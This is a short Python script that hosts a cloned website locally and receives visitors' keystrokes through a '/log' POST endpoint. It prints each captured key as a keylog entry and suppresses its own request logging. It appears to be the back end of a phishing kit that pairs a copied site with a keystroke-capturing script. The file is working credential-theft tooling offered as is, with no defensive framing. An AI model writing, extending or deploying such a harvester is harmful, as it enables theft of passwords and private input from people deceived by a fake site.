import http.server
import socketserver
import os
import json
import webbrowser

PORT = 7071
CLONE_DIR = "cloned_site"

# Detect the cloned site folder automatically
subdirs = [d for d in os.listdir(CLONE_DIR) if os.path.isdir(os.path.join(CLONE_DIR, d))]
if not subdirs:
    print("❌ No cloned site found in 'cloned_site/'")
    exit()
target_folder = subdirs[0]
target_path = os.path.join(CLONE_DIR, target_folder)
os.chdir(target_path)

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == "/log":
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode("utf-8")
            try:
                data = json.loads(post_data)
                key = data.get('key', '')
                if key.strip():
                    print(f"[📝 KEY] {repr(key)}")
            except Exception as e:
                print(f"[⚠️ ERROR] Failed to parse keylog: {e}")
            self.send_response(200)
            self.end_headers()
        else:
            self.send_error(404, "Not Found")

    def log_message(self, format, *args):
        return  # Silent log

if __name__ == "__main__":
    url = f"http://localhost:{PORT}"
    print(f"📡 Hosting cloned site at {url}")
    webbrowser.open(url)
    with socketserver.TCPServer(("", PORT), CustomHandler) as httpd:
        httpd.serve_forever()

